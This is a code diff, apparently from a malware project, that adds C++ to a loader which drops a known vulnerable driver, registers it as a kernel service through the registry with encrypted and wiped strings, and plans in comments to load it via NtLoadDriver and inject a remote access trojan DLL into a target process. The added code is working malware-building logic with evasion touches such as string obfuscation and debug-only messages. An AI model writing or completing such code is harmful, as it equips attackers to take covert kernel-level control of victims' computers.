@@ -39,15 +39,59 @@ int main(int argc, char** argv)
 #ifdef _DEBUG
         std::cerr << "Error: Could not write the vulnerable driver to disk." << std::endl;
 #endif 
-        return -1;
+        return 1;
     }
     wipeBytes(kph_driver);
     
     // Create the driver service keys in the registry
-    
-        
+    HKEY dservice;
 
 
+
+    // ***************************************** TODO! - resolve the registry funcs from winapi at runtime
+
+
+
+    std::string servicesPath = decrypt_string(str_servicesPath);
+    LSTATUS status = RegCreateKeyA(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice);
+    wipeStr(servicesPath);
+    if (status != ERROR_SUCCESS)
+    {
+#ifdef _DEBUG
+        std::cerr << "Error: Could not create driver service key" << std::endl;
+#endif 
+        return 1;
+    }
+
+    std::string imagePath = decrypt_string(str_ImagePath);
+    std::string driverNtPath = decrypt_string(str_kphDriverNtPath);
+    status = RegSetKeyValueA(dservice, NULL, imagePath.c_str(), REG_EXPAND_SZ, driverNtPath.c_str(), driverNtPath.size() + 1);
+    wipeStr(kphDriverDesiredPath);
+    wipeStr(imagePath);
+    if (status != ERROR_SUCCESS)
+    {
+#ifdef _DEBUG
+        std::cerr << "Error: Could not create 'ImagePath' registry value" << std::endl;
+#endif 
+        return 1;
+    }
+
+    DWORD ServiceTypeKernel = 1;
+    std::string type = decrypt_string(str_Type);
+    status = RegSetKeyValueA(dservice, NULL, type.c_str(), REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
+    wipeStr(type);
+    if (status != ERROR_SUCCESS)
+    {
+#ifdef _DEBUG
+        std::cerr << "Error: Could not create 'Type' registry value" << std::endl;
+#endif 
+        return 1;
+    }
+
+    RegCloseKey(dservice);
+
+    // Enable SE_LOAD_DRIVER_PRIVILIGE via RtlAdjustPrivilige()
+    // Call NtLoadDriver()
 
     // Inject the RAT dll to the target process's virtual memory (after performing relocations)
 
